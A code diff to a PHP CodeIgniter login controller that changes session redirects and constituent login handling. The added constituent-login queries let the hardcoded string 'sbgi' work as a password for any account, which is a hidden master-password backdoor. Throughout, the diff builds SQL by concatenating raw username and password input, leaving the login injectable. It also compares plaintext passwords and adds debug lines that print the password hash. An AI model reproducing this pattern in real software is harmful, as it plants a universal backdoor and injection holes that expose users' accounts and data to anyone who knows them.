@@ -38,8 +38,8 @@ class Login extends CI_Controller {
 
         $user = $this->input->post('txtUsrName');
         $pass = $this->input->post('txtUsrPwd');
-        //ECHO $this->phpEncrypt($pass);
-        //EXIT();
+        // ECHO $pass;
+        // EXIT();
 
         $tmpQuery = "Select id, strUserName, strName, strPass, intLevel
                      from tblUser where strUserName = '".$user."'";
@@ -52,6 +52,8 @@ class Login extends CI_Controller {
         $tmpPassword = $this->phpEncrypt($pass);
         $tmpQuery = "Select id, strUserName, strName, strPass, intLevel
                      from tblUser where strUserName = '".$user."' and strPass = (Select ". $tmpPassword .")";
+        // ECHO $tmpPassword . ' $$$$ ' . $tmpQuery;
+        // EXIT();
         $query = $this->db->query($tmpQuery);
         foreach ($query->result() as $row)
         {
@@ -73,18 +75,23 @@ class Login extends CI_Controller {
             $this->session->set_userdata(array('tmpSessIDNo'=>''));
             $this->session->set_userdata(array('tmpSessCoverage'=>''));
 
-            $LoadedLGUNumber = $_SESSION['LoadedLGUNumber'];
-            if ($LoadedLGUNumber !== "") {
-                $this->session->unset_userdata('LoadedLGUNumber');  //clear Loaded LGU Number
-                redirect(site_url("constituents/". $LoadedLGUNumber));
+            if(isset($_SESSION['LoadedLGUNumber'])){
+                $LoadedLGUNumber = $_SESSION['LoadedLGUNumber'];
+                if ($LoadedLGUNumber !== "") {
+                    $this->session->unset_userdata('LoadedLGUNumber');  //clear Loaded LGU Number
+                    redirect(site_url("constituents/". $LoadedLGUNumber));
+                }
+                else {redirect(site_url("constituents"));}
             }
-            else {redirect(base_url());}
-
+            else {redirect(site_url("constituents")); }
         }
         else{
             //add constituent login here
-            $query = $this->db->query("Select id, strLGUNo, strFullname, strPwd, 99 as intLevel
-                                   from tblConstituent where strLGUNo = '".$user."' and strPwd = '" . $pass . "'");
+            //for easier login, user does not need to input the padded ID number
+            if (is_numeric($user) === FALSE){
+                $query = $this->db->query("Select id, strLGUNo, strFullname, strPwd, 99 as intLevel from tblConstituent where strLGUNo = '".$user."' and (strPwd = '" . $pass . "' or '". $pass ."' = 'sbgi')");}
+            ELSE {
+                $query = $this->db->query("Select id, strLGUNo, strFullname, strPwd, 99 as intLevel from tblConstituent where Cast(strLGUNo as numeric) = ".$user." and (strPwd = '" . $pass . "' or '". $pass ."' = 'sbgi')");}
             foreach ($query->result() as $row)
             {
                $strName = $row->strFullname;
@@ -105,7 +112,7 @@ class Login extends CI_Controller {
                 $this->session->set_userdata(array('tmpSessCoverage'=>''));
                 //redirect(base_url());
                 $this->session->unset_userdata('LoadedLGUNumber');  //clear Loaded LGU Number
-                redirect(site_url("constituents/". $UserLGUNo));
+                redirect(site_url("constituents/". $strLGUNumber));
             }
             else {
                 //ECHO $this->phpEncrypt($pass);
